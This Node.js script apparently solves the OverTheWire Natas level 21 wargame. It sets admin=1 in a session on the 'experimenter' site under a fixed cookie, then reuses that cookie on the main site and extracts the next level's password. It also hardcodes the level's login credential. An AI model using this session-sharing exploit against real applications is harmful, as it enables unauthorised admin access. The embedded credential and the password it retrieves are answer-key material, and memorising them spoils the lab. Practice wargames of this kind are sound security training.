const http = require('http');
const querystring = require('querystring');

const appHost = 'natas21-experimenter.natas.labs.overthewire.org';
const authHost = 'natas21.natas.labs.overthewire.org';

const options = {
  base: () => ({
    auth: 'natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=nickontheweb`,
    },
    path: '/index.php?debug=1',
    port: 80,
  }),
  get: () => ({...options.base(), method: 'GET', hostname: authHost}),
  post: () => ({...options.base(), method: 'POST', hostname: appHost}),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

const submit = (body, opts = options.post()) =>
  new Promise((resolve, reject) => {
    const req = http.request(opts, res => {
      let body = '';
      res.on('data', data => (body = body + data));
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
    req.write(querystring.stringify(body));
    req.end();
  });

submit({admin: 1, submit: true})
  .then(() => get())
  .then(body => {
    const wasAuthed = body.match(/Password/);

    wasAuthed ? console.log('Success!') : console.log('Failure!');
    if (!wasAuthed) return;

    const regex = /\n(Password: [a-zA-Z0-9]{32})<\/pre>/;
    const password = body.match(regex)[1];

    console.log(password);
  });
